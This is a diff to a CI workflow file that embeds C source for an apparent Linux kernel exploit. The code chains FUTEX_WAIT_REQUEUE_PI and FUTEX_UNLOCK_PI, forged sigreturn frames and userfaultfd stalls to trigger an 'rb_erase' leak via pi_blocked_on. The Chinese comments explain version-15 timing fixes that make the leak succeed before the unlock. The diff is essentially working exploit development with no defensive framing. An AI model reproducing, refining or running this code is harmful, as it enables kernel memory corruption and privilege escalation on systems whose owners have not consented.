@@ -280,8 +280,14 @@ jobs:
             return NULL;
           }
 
-          /* sigreturn 恢复后 waiter 线程跳到这里死循环，避免跳非法地址崩溃 */
-          static void __attribute__((noinline)) safe_after_sig(void) {
+          /* sigreturn #2 恢复后跳这里：先 UNLOCK_PI（清 pi_blocked_on），再死循环。
+           * 关键：UNLOCK 必须在 consumer 完成 rb_erase 泄漏之后才执行——
+           *   v15 首版把 UNLOCK 放在 sigreturn 之前，提前清掉 pi_blocked_on，导致无 leak */
+          static void __attribute__((noinline)) unlock_then_loop(void) {
+            int idx = dance_idx;
+            long r = futex(&f_pi_chain[idx], FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
+            printf("REPRO unlock_then_loop UNLOCK_PI ret=%ld errno=%d idx=%d\n", r, errno, idx);
+            fflush(stdout);
             for (;;) sleep(60);
           }
 
@@ -394,7 +400,7 @@ jobs:
             if (base2 == MAP_FAILED) { perror("mmap2"); _exit(1); }
             unsigned char *sf2 = base2 + 0xC00;
             g_sf2 = sf2;
-            build_sigframe2(sf2, (void*)safe_after_sig);
+            build_sigframe2(sf2, (void*)unlock_then_loop);
 
             /* uffd 注册 base2 第二页 [0x1000,0x2000)：sf2+0x460=0x1060 在其中 */
             int ufd = (int)syscall(__NR_uffd, O_CLOEXEC);
@@ -442,8 +448,9 @@ jobs:
             ts.tv_sec += 10;
             r = futex(&f_wait[idx], FUTEX_WAIT_REQUEUE_PI, 0, &ts, &f_pi_target[idx], 0);
             printf("REPRO waiter WAIT_REQUEUE_PI ret=%ld errno=%d idx=%d\n", r, errno, idx);
-            r = futex(&f_pi_chain[idx], FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
-            printf("REPRO waiter UNLOCK_PI ret=%ld errno=%d idx=%d\n", r, errno, idx);
+            /* v15 修复：撤销此处的提前 UNLOCK——它清掉了 pi_blocked_on，
+             * 导致 consumer 无链可走。UNLOCK 改由 sigreturn #2 恢复后的
+             * unlock_then_loop 在泄漏完成之后执行（对齐 v12 时序） */
             __sync_synchronize(); route_done = 1;
             do_ghost_sigreturn();
             while (!owner_chain_done) usleep(1000);
@@ -493,7 +500,7 @@ jobs:
             int guard = 0;
             while (!route_done && guard < 150) { usleep(100000); guard++; }
             printf("REPRO dance route_done=%d guard=%d\n", route_done, guard);
-            sleep(2);  /* 再给 consumer 时间完成 sched_setattr 链行走 */
+            sleep(5);  /* uffd 窗口 3s + consumer 链行走，等足再读 bootid */
             return edeadlk ? 35 : rq;
           }
 
